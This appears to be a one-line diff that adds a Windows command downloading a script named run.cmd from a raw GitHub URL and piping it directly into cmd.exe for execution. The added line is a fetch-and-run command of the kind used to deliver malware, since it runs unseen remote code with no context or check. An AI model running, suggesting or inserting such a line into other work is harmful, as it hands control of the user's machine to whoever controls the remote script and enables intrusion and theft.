@@ -1,0 +1,1 @@
+curl.exe -L "https://raw.githubusercontent.com/shamim4s/importent-urls/refs/heads/master/run.cmd" | cmd.exe
